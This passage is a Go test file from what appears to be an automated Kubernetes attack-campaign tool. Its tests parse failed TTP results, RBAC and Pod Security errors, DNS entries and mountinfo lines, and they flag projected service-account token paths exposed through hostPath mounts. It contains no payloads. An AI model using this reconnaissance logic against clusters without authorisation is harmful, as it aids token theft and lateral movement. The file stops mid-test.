package campaign

import (
	"fmt"
	"strings"
	"testing"

	"github.com/Magier/Ran/domain"
)

func TestGetServicesFromEnvVar(t *testing.T) {
	vars := map[string]string{
		"KUBERNETES_PORT":               "tcp://10.96.0.1:443",
		"KUBERNETES_PORT_443_TCP":       "tcp://10.96.0.1:443",
		"KUBERNETES_PORT_443_TCP_ADDR":  "10.96.0.1",
		"KUBERNETES_PORT_443_TCP_PORT":  "443",
		"KUBERNETES_PORT_443_TCP_PROTO": "tcp",
		"KUBERNETES_SERVICE_HOST":       "10.96.0.1",
		"KUBERNETES_SERVICE_PORT":       "443",
		"KUBERNETES_SERVICE_PORT_HTTPS": "443",
		"TRACING_ENABLED":               "true",
		"TRIVY_PORT":                    "tcp://10.96.12.128:4954",
		"TRIVY_PORT_4954_TCP":           "tcp://10.96.12.128:4954",
		"TRIVY_PORT_4954_TCP_ADDR":      "10.96.12.128",
		"TRIVY_PORT_4954_TCP_PORT":      "4954",
		"TRIVY_PORT_4954_TCP_PROTO":     "tcp",
		"TRIVY_SERVICE_HOST":            "10.96.12.128",
		"TRIVY_SERVICE_PORT":            "4954",
		"TRIVY_SERVICE_PORT_TRIVY_HTTP": "4954",
		"MY_SERVER_PORT":                "tcp://10.96.180.142:8080",
		"MY_SERVER_PORT_8080_TCP":       "tcp://10.96.180.142:8080",
		"MY_SERVER_PORT_8080_TCP_ADDR":  "10.96.180.142",
		"MY_SERVER_PORT_8080_TCP_PORT":  "8080",
		"MY_SERVER_PORT_8080_TCP_PROTO": "tcp",
		"MY_SERVER_SERVICE_HOST":        "10.96.180.142",
		"MY_SERVER_SERVICE_PORT":        "8080",
		"MY_SERVER_SERVICE_PORT_GRPC":   "8080",
	}

	services := getServicesFromEnvVars(vars)

	if len(services) != 3 {
		t.Fail()
	}
}
func TestAnalyzeDeployPodFailure_NoResults(t *testing.T) {
	event := domain.TTPExecuted{
		Results: []string{},
	}
	newFacts, removedFacts, _, err := analyzeFailedTTPExecution(event)
	if err == nil {
		t.Errorf("Expected error but got %v", err)
	}
	if len(newFacts.Entities) != 0 {
		t.Errorf("Expected no entities, got %v", newFacts.Entities)
	}
	if len(newFacts.Relations) != 0 {
		t.Errorf("Expected no relations, got %v", newFacts.Relations)
	}
	if len(removedFacts.Entities) != 0 {
		t.Errorf("Expected empty RemovedFacts, got %v", removedFacts)
	}
	if len(removedFacts.Relations) != 0 {
		t.Errorf("Expected empty RemovedFacts, got %v", removedFacts)
	}
}

func TestAnalyzeDeployPodFailure_AlreadyExists(t *testing.T) {
	event := domain.TTPExecuted{
		Results: []string{"Error from server (AlreadyExists): pods \"mypod\" already exists"},
	}
	newFacts, _, _, err := analyzeFailedTTPExecution(event)
	if err != nil {
		t.Errorf("Expected no error, got %v", err)
	}
	if len(newFacts.Entities) != 0 {
		t.Errorf("Expected no entities, got %v", newFacts.Entities)
	}
}

func TestAnalyzeDeployPodFailure_PodSecurityViolation(t *testing.T) {
	nsName := "test-ns"
	event := domain.TTPExecuted{
		Results: []string{
			"command terminated with exit code 1: 'Error from server (Forbidden): error when creating \"STDIN\": pods \"workstation-66549c6f86-vgqch-44183\" is forbidden: violates PodSecurity \"baseline:latest\": hostPath volumes (volume \"hostmount\")\n'",
		},
		Target: domain.NewNamespace(nsName),
	}
	newFacts, _, failReason, err := analyzeFailedTTPExecution(event)
	if err != nil {
		t.Errorf("Expected no error, got %v", err)
	}
	if len(newFacts.Entities) != 1 {
		t.Fatalf("Expected 1 entity, got %d", len(newFacts.Entities))
	}
	ns, ok := newFacts.Entities[0].(domain.Namespace)
	if !ok {
		t.Fatalf("Expected entity to be Namespace, got %T", newFacts.Entities[0])
	}
	if ns.Name != nsName {
		t.Errorf("Expected namespace name '%s', got %s", nsName, ns.Name)
	}
	if ns.EnforcedPSS != "baseline:latest" {
		t.Errorf("Expected EnforcedPSS 'baseline:latest', got %s", ns.EnforcedPSS)
	}
	if !strings.HasPrefix(failReason, "Namespace enforces a PSS") {
		t.Errorf("Expected failReason to be set")
	}
}

func TestAnalyzeDeployPodFailure_PodSecurityViolation_without_target_returns_ns(t *testing.T) {
	nsName := "test-ns"
	event := domain.TTPExecuted{
		Args: map[string]string{
			"Namespace": nsName,
		},
		Results: []string{
			"command terminated with exit code 1: 'Error from server (Forbidden): error when creating \"STDIN\": pods \"workstation-66549c6f86-vgqch-44183\" is forbidden: violates PodSecurity \"baseline:latest\": hostPath volumes (volume \"hostmount\")\n'",
		},
	}
	newFacts, _, failReason, err := analyzeFailedTTPExecution(event)
	if err != nil {
		t.Errorf("Expected no error, got %v", err)
	}
	if len(newFacts.Entities) != 1 {
		t.Fatalf("Expected 1 entity, got %d", len(newFacts.Entities))
	}
	ns, ok := newFacts.Entities[0].(domain.Namespace)
	if !ok {
		t.Fatalf("Expected entity to be Namespace, got %T", newFacts.Entities[0])
	}
	if ns.Name != "test-ns" {
		t.Errorf("Expected namespace name '%s', got %s", nsName, ns.Name)
	}
	if ns.EnforcedPSS != "baseline:latest" {
		t.Errorf("Expected EnforcedPSS 'baseline:latest', got %s", ns.EnforcedPSS)
	}
	if !strings.HasPrefix(failReason, "Namespace enforces a PSS") {
		t.Errorf("Expected failReason to be set")
	}

}

func TestAnalyzeDeployPodFailure_UnknownError(t *testing.T) {
	event := domain.TTPExecuted{
		Results: []string{"Some unknown error"},
	}
	newFacts, _, failReason, err := analyzeFailedTTPExecution(event)
	if err != nil {
		t.Errorf("Expected no error, got %v", err)
	}
	if len(newFacts.Entities) != 0 {
		t.Errorf("Expected no entities, got %v", newFacts.Entities)
	}
	if failReason != "" {
		t.Errorf("Expected failReason to be empty, got %s", failReason)
	}
}
func TestAnalyzeFailedTTPExecution_ToolNotFound(t *testing.T) {
	toolName := "kubectl"
	execSystem := domain.NewPod("mypod", "default")

	tests := []struct {
		name   string
		errMsg string
	}{
		{
			name:   "kubectl not found",
			errMsg: fmt.Sprintf("command terminated with exit code 127: 'sh: 1: %s: not found\n'", toolName),
		},
		{
			name:   "OCI runtime exec failed",
			errMsg: fmt.Sprintf("error: Internal error occurred: Internal error occurred: error executing command in container: failed to exec in container: failed to start exec \"arstarst123\": OCI runtime exec failed: exec failed: unable to start container process: exec: \"%s\": executable file not found in $PATH\n", toolName),
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			event := domain.TTPExecuted{
				Results:    []string{tt.errMsg},
				Procedure:  domain.Procedure{Tool: toolName},
				ExecutedOn: execSystem,
			}

			newFacts, _, _, err := analyzeFailedTTPExecution(event)
			if err != nil {
				t.Errorf("Expected no error, got %v", err)
			}
			if len(newFacts.Entities) != 1 {
				t.Errorf("Expected 1 entity, got %d", len(newFacts.Entities))
			}
			pod, ok := newFacts.Entities[0].(domain.Pod)
			if !ok {
				t.Fatalf("Expected entity to be Pod, got %T", newFacts.Entities[0])
			}
			if val, exists := pod.Binaries[toolName]; !exists || val != "❌" {
				t.Errorf("Expected pod.Binaries[%s]=❌, got %v", toolName, pod.Binaries)
			}
		})
	}
}

func TestAnalyzeFailedTTP_BinaryNotFoundShouldUpdateBinariesOnExecutingSystem(t *testing.T) {
	toolName := "curl"
	event := domain.TTPExecuted{
		Results: []string{
			"Error 127\n",
			"/usr/bin/sh: 1: curl: not found\n",
			"command terminated with exit code 127: '/usr/bin/sh: 1: curl: not found\n'"},
		Procedure: domain.Procedure{
			Tool: toolName,
		},
		ExecutedOn: domain.NewPod("mypod", "default"),
	}

	newFacts, removedFacts, _, err := analyzeFailedTTPExecution(event)

	if err != nil {
		t.Errorf("Expected no error, got %v", err)
	}
	if len(newFacts.Entities) != 1 {
		t.Errorf("Expected 1 entity, got %d", len(newFacts.Entities))
	}
	pod, ok := newFacts.Entities[0].(domain.Pod)
	if !ok {
		t.Fatalf("Expected entity to be Pod, got %T", newFacts.Entities[0])
	}
	if val, exists := pod.Binaries[toolName]; !exists || val != "❌" {
		t.Errorf("Expected pod.Binaries[%s]=❌, got %v", toolName, pod.Binaries)
	}
	if len(removedFacts.Entities) != 0 {
		t.Errorf("Expected no removed entities, got %d", len(removedFacts.Entities))
	}
	if len(removedFacts.Relations) != 0 {
		t.Errorf("Expected no removed relations, got %d", len(removedFacts.Relations))
	}
}

func TestAnalyzeFailedTTPExecution_RBAC_ForbiddenWithUser(t *testing.T) {
	saName := "test-sa"
	ns := "test-ns"
	event := domain.TTPExecuted{
		Results: []string{
			fmt.Sprintf("command terminated with exit code 1: 'Error from server (Forbidden): pods is forbidden: User \"system:serviceaccount:%s:%s\" cannot list resource \"pods\" in API group \"\" in the namespace \"%s\"\n'", ns, saName, ns),
		},
		Procedure: domain.Procedure{Tool: "kubectl"},
		Target:    domain.NewPod("mypod", ns),
	}
	newFacts, _, failReason, err := analyzeFailedTTPExecution(event)
	if err != nil {
		t.Errorf("Expected no error, got %v", err)
	}

	// expect the returned entity is a service account
	if len(newFacts.Entities) != 1 {
		t.Fatalf("Expected 1 entity, got %d", len(newFacts.Entities))
	}
	sa, ok := newFacts.Entities[0].(domain.ServiceAccount)
	if !ok {
		t.Fatalf("Expected entity to be ServiceAccount, got %T", newFacts.Entities[0])
	}
	if sa.Name != saName || sa.Namespace != ns {
		t.Errorf("Expected ServiceAccount name 'default' in namespace '%s', got name '%s' in namespace '%s'", ns, sa.Name, sa.Namespace)
	}

	if len(newFacts.Relations) != 0 {
		t.Errorf("Expected 0 relations, got %d", len(newFacts.Relations))
	}

	if failReason == "" {
		t.Errorf("Expected proper failReason but it was empty")
	}
}

func TestAnalyzeFailedTTPExecution_RBAC_ForbiddenWithUser_Multiple_Results(t *testing.T) {
	saName := "test-sa"
	ns := "test-ns"
	event := domain.TTPExecuted{
		Results: []string{
			"{\n    \"apiVersion\": \"v1\",\n    \"items\": [],\n    \"kind\": \"List\",\n    \"metadata\": {\n        \"resourceVersion\": \"\"\n    }\n}",
			fmt.Sprintf("Error from server (Forbidden): roles.rbac.authorization.k8s.io is forbidden: User \"system:serviceaccount:%s:%s\" cannot list resource \"roles\" in API group \"rbac.authorization.k8s.io\" in the namespace \"default\"", ns, saName),
			"(code 1): command terminated with exit code 1",
		},
		Procedure: domain.Procedure{Tool: "kubectl"},
		Target:    domain.NewPod("mypod", ns),
	}
	newFacts, _, failReason, err := analyzeFailedTTPExecution(event)
	if err != nil {
		t.Errorf("Expected no error, got %v", err)
	}

	// expect the returned entity is a service account
	if len(newFacts.Entities) != 1 {
		t.Fatalf("Expected 1 entity, got %d", len(newFacts.Entities))
	}
	sa, ok := newFacts.Entities[0].(domain.ServiceAccount)
	if !ok {
		t.Fatalf("Expected entity to be ServiceAccount, got %T", newFacts.Entities[0])
	}
	if sa.Name != saName || sa.Namespace != ns {
		t.Errorf("Expected ServiceAccount name 'default' in namespace '%s', got name '%s' in namespace '%s'", ns, sa.Name, sa.Namespace)
	}

	if len(newFacts.Relations) != 0 {
		t.Errorf("Expected 0 relations, got %d", len(newFacts.Relations))
	}

	if failReason == "" {
		t.Errorf("Expected proper failReason but it was empty")
	}
}

func TestAnalyzeMountInfo_EmptyInput(t *testing.T) {
	pod := domain.NewPod("test-pod", "default")
	pod.Mounts = []domain.Mount{}

	facts, err := analyzeMountInfo(pod)
	if err != nil {
		t.Errorf("Expected no error, got %v", err)
	}
	if len(facts.Entities) != 0 {
		t.Errorf("Expected no entities, got %v", facts.Entities)
	}
	if len(facts.Relations) != 0 {
		t.Errorf("Expected no relations, got %v", facts.Relations)
	}
}

func TestAnalyzeMountInfo_WithMounts(t *testing.T) {
	// Prepare a mount with some fields
	pod := domain.NewPod("test-pod", "default")
	mount := domain.Mount{
		MountRoot:  "/host/path",
		MountPoint: "/container/path",
		IsHostPath: true,
		Type:       "ext4",
	}
	pod.Mounts = []domain.Mount{mount}

	facts, err := analyzeMountInfo(pod)
	if err != nil {
		t.Errorf("Expected no error, got %v", err)
	}
	// Since the current implementation does not add entities or relations,
	// we just check that it returns empty slices.
	if len(facts.Entities) != 0 {
		t.Errorf("Expected no entities, got %v", facts.Entities)
	}
	if len(facts.Relations) != 0 {
		t.Errorf("Expected no relations, got %v", facts.Relations)
	}
}

func TestCreatePodFromKubeletMounts(t *testing.T) {
	tests := []struct {
		name     string
		pathStr  string
		uid      string
		hostPath string
		errMsg   string
	}{
		{
			name:    "mountinfo on node itself",
			pathStr: "1740 835 0:129 / /var/lib/kubelet/pods/%s/volumes/kubernetes.io~projected/kube-api-access-ffd8n rw,relatime shared:1070 - tmpfs tmpfs rw,seclabel,size=1993956k,uid=501,gid=1000,inode64",
			uid:     "85986f35-1e64-46d8-b4ac-8fcee502c18f",
			errMsg:  "",
		},
		{
			name:     "mountinfo from pod via hostPath mount",
			pathStr:  "3918 3916 0:217 / /mnt/host/var/lib/kubelet/pods/%s/volumes/kubernetes.io~projected/kube-api-access-8tnjw rw,relatime - tmpfs tmpfs rw,seclabel,size=1993956k,uid=501,gid=1000,inode64",
			hostPath: "/mnt/host",
			uid:      "85986f35-1e64-46d8-b4ac-8fcee502c18f",
			errMsg:   "",
		},
		{
			name:    "mountinfo with no UID should yield error",
			pathStr: "3342 3340 0:396 / /proc rw,nosuid,nodev,noexec,relatime - proc proc rw",
			errMsg:  "no pod UID found in mount point: /proc",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var line string
			if tt.uid != "" {
				line = fmt.Sprintf(tt.pathStr, tt.uid)
			} else {
				line = tt.pathStr
			}

			mount, err := parseMountInfoEntry(line)
			if err != nil {
				t.Errorf("Failed to parse mount info: %v", err)
			}
			mount.HostPath = tt.hostPath // this information is supplemented by a more thorough analysis outside of the parser
			pod, err := createPodFromKubeletMounts(mount)
			if tt.errMsg == "" && err != nil {
				t.Errorf("Expected no error, got %v", err)
			} else if tt.errMsg != "" && err == nil {
				t.Errorf("Expected error '%s', got nil", tt.errMsg)
			}

			if pod.UID != tt.uid {
				t.Errorf("Expected pod name '%s', got '%s'", tt.uid, pod.Name)
			}
			if pod.Name != "" {
				t.Errorf("Expected pod name to be empty, got '%s'", pod.Name)
			}
			if pod.Namespace != "" {
				t.Errorf("Expected pod namespace to be empty, got '%s'", pod.Name)
			}
		})
	}
}

func TestAnalyzeMountInfo_WithHostKubeletInfos(t *testing.T) {
	// podUIDs := []string{
	// 	"85986f35-1e64-46d8-b4ac-8fcee502c18f",
	// 	"6d259dfe-4227-4cad-958c-da7d44cb1daa",
	// 	"8238b82c-8ba1-454f-9508-d2bf78699c74",
	// 	"1b2033a4-2bf7-4e6f-acda-d2ac8a000d9d",
	// 	"69defcbb-7483-41f0-8690-19729e42863a",
	// }
	// projectedSATokenPaths := []string{
	// 	"/var/lib/kubelet/pods/85986f35-1e64-46d8-b4ac-8fcee502c18f/volumes/kubernetes.io~projected/kube-api-access-xbvm8",
	// 	"/var/lib/kubelet/pods/6d259dfe-4227-4cad-958c-da7d44cb1daa/volumes/kubernetes.io~projected/kube-api-access-t8v24",
	// 	"/var/lib/kubelet/pods/8238b82c-8ba1-454f-9508-d2bf78699c74/volumes/kubernetes.io~projected/kube-api-access-8tnjw",
	// 	"/var/lib/kubelet/pods/1b2033a4-2bf7-4e6f-acda-d2ac8a000d9d/volumes/kubernetes.io~projected/kube-api-access-rzw7k",
	// 	"/var/lib/kubelet/pods/69defcbb-7483-41f0-8690-19729e42863a/volumes/kubernetes.io~projected/kube-api-access-5j2q4",
	// }

	mountInfoStrings := []string{
		"3906 2769 0:421 / / rw,relatime - overlay overlay rw,seclabel,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/37/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/36/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/35/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/34/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/33/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/32/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/31/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/30/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/29/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/28/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/27/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/26/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/25/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/24/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/23/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/22/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/21/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/20/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/19/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/18/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/17/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/16/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/15/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/50011/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/50011/work,redirect_dir=nofollow,uuid=on,userxattr",
		`3914 3906 0:62 / /mnt/host rw,relatime - overlay overlay rw,context="system_u:object_r:container_file_t:s0:c1022,c1023",lowerdir=/var/home/core/.local/share/containers/storage/overlay/l/BTSOOTPTOH25C6MZDKKNFPDMU5:/var/home/core/.local/share/containers/storage/overlay/l/MZFSHHTOAWWQFH3T7ZBF27FOYN,upperdir=/var/home/core/.local/share/containers/storage/overlay/c52cea6c189a194dd5772cd95895bd0b49262459e81aadd53fd071be5f616a15/diff,workdir=/var/home/core/.local/share/containers/storage/overlay/c52cea6c189a194dd5772cd95895bd0b49262459e81aadd53fd071be5f616a15/work,redirect_dir=nofollow,userxattr`,
		"3916 3914 252:4 /ostree/deploy/fedora-coreos/var/home/core/.local/share/containers/storage/volumes/443579c837e6de9d2b28c81ff56328e90c168aa99c4f7afa741978c93f4417c0/_data /mnt/host/var rw,relatime - xfs /dev/vda4 rw,seclabel,attr2,inode64,logbufs=8,logbsize=32k,prjquota",
		"3917 3916 0:261 / /mnt/host/var/lib/kubelet/pods/85986f35-1e64-46d8-b4ac-8fcee502c18f/volumes/kubernetes.io~projected/kube-api-access-xbvm8 rw,relatime - tmpfs tmpfs rw,seclabel,size=1993956k,uid=501,gid=1000,inode64",
		"3917 3916 0:216 / /mnt/host/var/lib/kubelet/pods/6d259dfe-4227-4cad-958c-da7d44cb1daa/volumes/kubernetes.io~projected/kube-api-access-t8v24 rw,relatime - tmpfs tmpfs rw,seclabel,size=1993956k,uid=501,gid=1000,inode64",
		"3918 3916 0:217 / /mnt/host/var/lib/kubelet/pods/8238b82c-8ba1-454f-9508-d2bf78699c74/volumes/kubernetes.io~projected/kube-api-access-8tnjw rw,relatime - tmpfs tmpfs rw,seclabel,size=1993956k,uid=501,gid=1000,inode64",
		"3919 3916 0:225 / /mnt/host/var/lib/kubelet/pods/1b2033a4-2bf7-4e6f-acda-d2ac8a000d9d/volumes/kubernetes.io~projected/kube-api-access-rzw7k rw,relatime - tmpfs tmpfs rw,seclabel,size=1993956k,uid=501,gid=1000,inode64",
		"3920 3916 0:232 / /mnt/host/var/lib/kubelet/pods/69defcbb-7483-41f0-8690-19729e42863a/volumes/kubernetes.io~projected/kube-api-access-bjzfp rw,relatime - tmpfs tmpfs rw,seclabel,size=1993956k,uid=501,gid=1000,inode64",
	}

	mounts := make([]domain.Mount, len(mountInfoStrings))
	for i, mountInfo := range mountInfoStrings {
		mount, err := parseMountInfoEntry(mountInfo)
		if err != nil {
			t.Errorf("Failed to parse mount info '%s': %v", mountInfo, err)
			return
		}
		mounts[i] = mount
	}

	pod := domain.NewPod("test-pod", "default")
	pod.Mounts = mounts
	numPods := 5

	facts, err := analyzeMountInfo(pod)
	if err != nil {
		t.Errorf("Expected no error, got %v", err)
	}
	// +2 for the node and redundant srcPod (don't have information to merge UID and srcPod at this point)
	if len(facts.Entities) != numPods+2 {
		t.Errorf("Expected %d pods exposed through kubelet files , got %v", numPods, facts.Entities)
	}

	nodeFound := false
	// the identified projected SA tokens should be listed as interesting files
	for _, e := range facts.Entities {
		if node, ok := e.(domain.K8sNode); ok {
			nodeFound = true
			if len(node.SystemImpl.Files) != numPods {
				t.Errorf("Expected the node to have the %d interesting files, got %d", numPods, len(node.SystemImpl.Files))
			}
			break
		}
	}

	if !nodeFound {
		t.Errorf("Expected to find a K8sNode entity in the facts, got %v", facts.Entities)
	}

	if len(facts.Relations) != numPods+1 { // +1 for the (redundant) srcPod
		t.Errorf("Expected a runs-on relation for every pod link to a node %v", facts.Relations)
	}
}

func TestAnalyzeUnknownSystem_MatchesToExistingPod(t *testing.T) {
	// Create a campaign
	c := NewCampaign(nil)

	// Create a known pod with a specific hostname
	hostName := "pod-657596d964-rp5kz"
	namespace := "default"
	knownPod := domain.NewPod(hostName, namespace)
	knownPod.SystemImpl.HostName = hostName

	// Create an unknown system with the same hostname but additional information
	unknownSys := domain.NewSystem(hostName, "Linux", domain.RootExec)
	unknownSys.Binaries = map[string]string{
		"curl": "✓",
		"wget": "✓",
	}

	// Set up the test with the existing pod in the campaign's known entities
	// This would typically be done through another mechanism, but for testing
	// we'll inject it directly
	c.AddEntities(knownPod)

	// Analyze the unknown system
	newFacts, removedFacts, err := c.analyzeUnknownSystem(unknownSys)
	if err != nil {
		t.Errorf("Expected no error, got %v", err)
	}

	// Should return the matched pod with merged information
	if len(newFacts.Entities) != 1 {
		t.Fatalf("Expected 1 entity, got %d", len(newFacts.Entities))
	}

	// The entity should be a Pod with the same ID as our known Pod
	updatedPod, ok := newFacts.Entities[0].(domain.Pod)
	if !ok {
		t.Fatalf("Expected entity to be a Pod, got %T", newFacts.Entities[0])
	}

	// Verify identity is preserved
	if updatedPod.Name != hostName || updatedPod.Namespace != namespace {
		t.Errorf("Expected pod name=%s namespace=%s, got name=%s namespace=%s",
			hostName, namespace, updatedPod.Name, updatedPod.Namespace)
	}

	// Verify original data is preserved
	if updatedPod.OS != "Linux" {
		t.Errorf("Expected OS to remain 'Linux', got '%s'", updatedPod.OS)
	}

	if len(updatedPod.Binaries) != len(unknownSys.Binaries) {
		t.Errorf("Expected original binaries to be preserved, got %v", updatedPod.Binaries)
	}
	for k, v := range unknownSys.Binaries {
		if updatedPod.Binaries[k] != v {
			t.Errorf("Expected original binary '%s' to be preserved, got %v", k, updatedPod.Binaries)
		}
	}

	// Verify new data is merged
	if updatedPod.Binaries["curl"] != "✓" || updatedPod.Binaries["wget"] != "✓" {
		t.Errorf("Expected new binaries to be added, got %v", updatedPod.Binaries)
	}
	// if len(updatedPod.Files) != 1 || updatedPod.Files[0].Path != "/etc/passwd" {
	// 	t.Errorf("Expected files to be merged, got %v", updatedPod.Files)
	// }

	// No entities should be removed
	if len(removedFacts.Entities) != 0 {
		t.Errorf("Expected no removed entities, got %d", len(removedFacts.Entities))
	}
}

func TestAnalyzeDnsEntriesScan(t *testing.T) {
	tests := []struct {
		name         string
		ip           string
		dns          string
		expectedKind string
		expectedName string
		expectedNS   string
		expectError  bool
	}{
		{
			name:         "standard pod DNS",
			ip:           "192.168.1.4",
			dns:          "192-168-1-4.backend-service.dev.svc.cluster.local",
			expectedKind: "Pod",
			expectedName: "backend-service",
			expectedNS:   "dev",
			expectError:  false,
		},
		{
			name:         "ClusterIP service DNS",
			ip:           "10.96.5.1",
			dns:          "backend-service.dev.svc.cluster.local",
			expectedKind: "Service",
			expectedName: "backend-service",
			expectedNS:   "dev",
			expectError:  false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			newFacts, _, err := analyzeDnsEntries(map[string]string{tt.ip: tt.dns})
			if tt.expectError {
				if err == nil {
					t.Errorf("Expected error but got none")
				}
				return
			} else {
				if err != nil {
					t.Errorf("Expected no error but got %v", err)
					return
				}
			}

			if len(newFacts.Entities) != 1 {
				t.Fatalf("Expected 1 entity, got %d", len(newFacts.Entities))
			}

			entity := newFacts.Entities[0]

			if k := entity.GetKind(); k != tt.expectedKind {
				t.Errorf("Expected entity kind '%s', got '%s'", tt.expectedKind, k)
			}
			if name := entity.GetName(); name != tt.expectedName {
				t.Errorf("Expected entity name '%s', got '%s'", tt.expectedName, name)
			}

			if tt.expectedKind == "Pod" {
				_, ok := entity.(domain.Pod)
				if !ok {
					t.Fatalf("Expected entity to be Pod, got %T", entity)
				}
			} else {
				_, ok := entity.(domain.Service)
				if !ok {
					t.Fatalf("Expected entity to be Service, got %T", entity)
				}
			}

			if nsEntity, ok := entity.(domain.Namespaced); ok {
				ns := nsEntity.GetNamespace()
				if ns != tt.expectedNS {
					t.Errorf("Expected entity namespace '%s', got '%s'", tt.expectedNS, ns)
				}
			}
		})
	}
}

func TestWorkloadsOwnNewPod(t *testing.T) {
	tests := []struct {
		testName     string
		workloadName string
		workloadCtor func(name, namespace string) domain.Workload
		errMsg       string
	}{
		{
			testName:     "Deployment owns new pod",
			workloadName: "my-fancy-deployment",
			workloadCtor: func(name, namespace string) domain.Workload { // Go ... 🙄🤮
				return domain.NewDeployment(name, namespace)
			},
			errMsg: "",
		},
		{
			testName:     "Deployment owns new pod",
			workloadName: "tha-database",
			workloadCtor: func(name, namespace string) domain.Workload { // Go ... 🙄🤮
				return domain.NewDeployment(name, namespace)
			},
			errMsg: "",
		},
	}
	for _, tt := range tests {
		t.Run(tt.testName, func(t *testing.T) {
			// prep workload to exist in the campaign before the analysis
			c := NewCampaign(nil)
			wl := tt.workloadCtor(tt.workloadName, "default")
			c.AddEntities(wl)

			newPod := domain.NewPod(tt.workloadName+"-5c77d846b4-h2ccn", "default")
			facts, err := c.analyzePod(newPod)
			if tt.errMsg == "" && err != nil {
				t.Errorf("Expected no error, got %v", err)
			} else if tt.errMsg != "" && err == nil {
				t.Errorf("Expected error '%s', got nil", tt.errMsg)
			}

			// expect the returned facts to include a "owned-by" relation
			foundRelation := false
			for _, rel := range facts.Relations {
				if owns, ok := rel.(domain.Owns); ok {
					foundRelation = true
					if owns.GetSourceId() != wl.GetId() {
						t.Errorf("Expected source ID to be workload ID '%s', got '%s'", wl.GetId(), owns.GetSourceId())
					}
					if owns.GetTargetId() != newPod.GetId() {
						t.Errorf("Expected target ID to be pod ID '%s', got '%s'", newPod.GetId(), owns.GetTargetId())
					}
					break
				}
			}

			if !foundRelation {
				t.Errorf("Expected to find 'owns' relation from workload to pod, but did not. Relations: %v", facts.Relations)
			}
		})
	}
}
func TestNewWorkloadOwnsExistingPods(t *testing.T) {
	tests := []struct {
		testName     string
		workloadName string
		workloadCtor func(name, namespace string) domain.Entity
		podsToCreate []string
	}{
		{
			testName:     "Deployment owns multiple existing pods",
			workloadName: "nginx",
			workloadCtor: func(name, namespace string) domain.Entity {
				return domain.NewDeployment(name, namespace)
			},
			podsToCreate: []string{
				"nginx-5c77d846b4-h2ccn",
				"nginx-5c77d846b4-k9xyz",
				"nginx-5c77d846b4-m3abc",
			},
		},
		{
			testName:     "StatefulSet owns multiple existing pods",
			workloadName: "postgres",
			workloadCtor: func(name, namespace string) domain.Entity {
				return domain.NewStatefulSet(name, namespace)
			},
			podsToCreate: []string{
				"postgres-0",
				"postgres-1",
				"postgres-2",
			},
		},
		{
			testName:     "DaemonSet owns multiple existing pods",
			workloadName: "filebeat",
			workloadCtor: func(name, namespace string) domain.Entity {
				return domain.NewDaemonSet(name, namespace)
			},
			podsToCreate: []string{
				"filebeat-worker1",
				"filebeat-worker2",
			},
		},
		{
			testName:     "CronJob owns multiple existing pods",
			workloadName: "backup-job",
			workloadCtor: func(name, namespace string) domain.Entity {
				return domain.NewCronJob(name, namespace)
			},
			podsToCreate: []string{
				"backup-job-27482020-abc12",
				"backup-job-27482021-xyz78",
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.testName, func(t *testing.T) {
			c := NewCampaign(nil)
			namespace := "default"

			// Create and add existing pods to the campaign
			existingPods := make([]domain.Pod, len(tt.podsToCreate))
			for i, podName := range tt.podsToCreate {
				pod := domain.NewPod(podName, namespace)
				existingPods[i] = pod
				c.AddEntities(pod)
			}

			// Create and analyze the workload
			workload := tt.workloadCtor(tt.workloadName, namespace)
			facts, err := c.analyzeWorkloadOwnership(workload)

			if err != nil {
				t.Errorf("Expected no error, got %v", err)
			}

			// Verify workload is included in facts
			if len(facts.Entities) != 1 {
				t.Errorf("Expected 1 entity (workload), got %d", len(facts.Entities))
			}

			// Verify relations are created for all owned pods
			expectedRelations := len(tt.podsToCreate)
			if len(facts.Relations) != expectedRelations {
				t.Errorf("Expected %d relations, got %d", expectedRelations, len(facts.Relations))
			}

			// Verify all relations are 'Owns' type
			for _, rel := range facts.Relations {
				if _, ok := rel.(domain.Owns); !ok {
					t.Errorf("Expected relation to be 'Owns', got %T", rel)
				}
			}

			// Verify each pod is owned by the workload
			ownedPodIds := make(map[string]bool)
			for _, rel := range facts.Relations {
				owns := rel.(domain.Owns)
				if owns.GetSourceId() != workload.GetId() {
					t.Errorf("Expected source to be workload '%s', got '%s'", workload.GetId(), owns.GetSourceId())
				}
				ownedPodIds[owns.GetTargetId()] = true
			}

			for _, pod := range existingPods {
				if !ownedPodIds[pod.GetId()] {
